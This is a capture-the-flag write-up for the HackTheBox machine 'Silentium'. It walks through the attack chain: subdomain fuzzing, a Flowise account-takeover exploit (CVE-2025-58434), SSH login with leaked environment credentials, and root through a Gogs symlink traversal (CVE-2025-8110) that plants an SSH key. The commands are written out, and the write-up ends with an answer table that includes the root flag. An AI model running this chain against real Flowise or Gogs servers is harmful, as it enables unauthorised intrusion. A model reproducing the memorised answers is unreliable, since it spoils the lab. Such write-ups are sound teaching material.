TITLE: Silentium
CATEGORY: HackTheBox
DATE: 2026-05-10
IMAGE: ./assets/Silentium.png
---
# Silentium

## Recon

Nmap reveals port 80 (HTTP) is open.

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Silentium | Institutional Capital & Lending Solutions
```

Subdomain enumeration discovers `staging.silentium.htb`.

```bash
ffuf -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -w subdomains.txt -ac
```

On the main site, we find the email address for "Ben", the Head of Financial Systems: `ben@silentium.htb`.

## Exploitation

### Flowise (CVE-2025-58434 + CVE-2025-59528)

The staging site hosts Flowise, which is vulnerable to unauthenticated Account Takeover (ATO) and Remote Code Execution (RCE) via custom MCP. We can identify the version by visiting the `/api/v1/version` endpoint:

```bash
curl http://staging.silentium.htb/api/v1/version
# {"version":"3.0.5"}
```

We use an exploit script to reset Ben\'s password and gain access:

```bash
python3 solve.py -t http://staging.silentium.htb -e ben@silentium.htb
```

After resetting the password to `Pwn3d!2026`, we log in and find environment variables in the container:

```bash
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=F1l3_d0ck3r
SENDER_EMAIL=ben@silentium.htb
SMTP_PASSWORD=r04D!!_R4ge
```

### SSH Access

The `FLOWISE_PASSWORD` (or Ben\'s system password) allows SSH access to the host machine:

```bash
ssh ben@silentium.htb
# Password: F1l3_d0ck3r
```

After logging in, we retrieve `user.txt`.

## Privilege Escalation

### Gogs Symlink Traversal (CVE-2025-8110)

Checking local services, we find Gogs running on port 3001. We can check its version by running the binary directly with the `--version` flag:

```bash
ben@silentium:/opt/gogs/gogs$ ./gogs --version
Gogs version 0.13.3
```

Since the Gogs service is only listening on the local interface (`127.0.0.1`), we need to create an SSH tunnel to access it from our machine:

```bash
ssh -L 3001:127.0.0.1:3001 ben@silentium.htb
```

We can now exploit the symlink traversal vulnerability (CVE-2025-8110) by interacting with Gogs via `http://localhost:3001`.

```bash
#after creating a account on the site 
python3 exploit.py http://localhost:3001 -u lybecuhytu -p \'Pa$$w0rd!\' --rce-keys ~/.ssh/id_ed25519.pub --cleanup
```

Finally, we SSH in as root:

```bash
ssh -i ~/.ssh/id_ed25519 root@silentium.htb
# root@silentium:~# cat root.txt
# bd6a11bc1e78b633ddbd3b50e0ecc432
```

## Tasks

| Task | Question | Answer |
| :--- | :--- | :--- |
| 1 | What is the email address found on the main site? | `ben@silentium.htb` |
| 2 | What software is running on the staging subdomain? | `Flowise` |
| 3 | What is the CVE for the Flowise ATO? | `CVE-2025-58434` |
| 4 | Submit user flag | `User flag owned` |
| 5 | What internal service is running on port 3001? | `Gogs` |
| 6 | What is the version of Gogs? | `0.13.3` |
| 7 | What is the CVE for the Gogs symlink traversal? | `CVE-2025-8110` |
| 8 | Submit root flag | `bd6a11bc1e78b633ddbd3b50e0ecc432` |
